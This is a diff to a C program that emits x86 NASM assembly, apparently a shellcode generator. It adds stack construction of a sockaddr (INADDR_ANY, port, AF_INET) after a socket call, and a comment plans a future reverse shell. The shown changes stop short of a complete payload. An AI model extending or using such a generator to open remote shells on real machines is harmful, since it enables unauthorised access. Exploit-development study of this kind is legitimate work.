@@ -7,6 +7,8 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <sys/socket.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
@@ -15,7 +17,7 @@
 #define REG_PORT_MIN    1024            // lowest registered port
 #define DEFAULT_PATH    "temp.nasm"
 
-typedef enum {eax, ebx, ecx, edx} reg32_t;
+typedef enum {eax, ebx, ecx, edx, esp} reg32_t;
 
 int temp_fd;
 
@@ -36,6 +38,32 @@ static void store_in_reg(uint32_t value, reg32_t reg);
 static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
     uint32_t arg_edx); 
 static void store_result(reg32_t result, reg32_t destination);
+static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family);
+
+
+static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family)
+{
+    uint16_t endian_corrected;
+
+    if (0 == ipv4)
+    {
+        dprintf(temp_fd, "\txor eax, eax\t\t; INADDR_ANY\n"
+            "\tpush eax\n");
+    }
+    else
+    {
+        dprintf(temp_fd, "\t; TODO: reverse shell will need IP parser\n");
+    }
+
+    // TODO: be careful with endianness.... will need to verify
+    endian_corrected = htons(port);
+    dprintf(temp_fd, "\tpush word 0x%04x\t; PORT=%d\n",
+        endian_corrected, port);
+
+    // these are always one byte numbers?
+    dprintf(temp_fd, "\tpush word %d\t\t; Family=%d\n\n", 
+        family, family);    
+}
 
 static const char * enum2reg8hi(reg32_t reg)
 {
@@ -138,6 +166,9 @@ static const char * enum2reg32(reg32_t reg)
             break;
         case edx:
             reg_name = "edx";
+            break;
+        case esp:
+            reg_name = "esp";
             break;
         default:
             reg_name = "ERR";
@@ -254,6 +285,12 @@ int main(int argc, char * argv[])
     
     // store socket fd
     store_result(eax, ebx);
+
+    // build sockaddr on the stack
+    build_sockaddr(INADDR_ANY, port, AF_INET);
+
+    // stack pointer into ecx
+    store_result(esp, ecx); 
 
     if (close(temp_fd))
     {
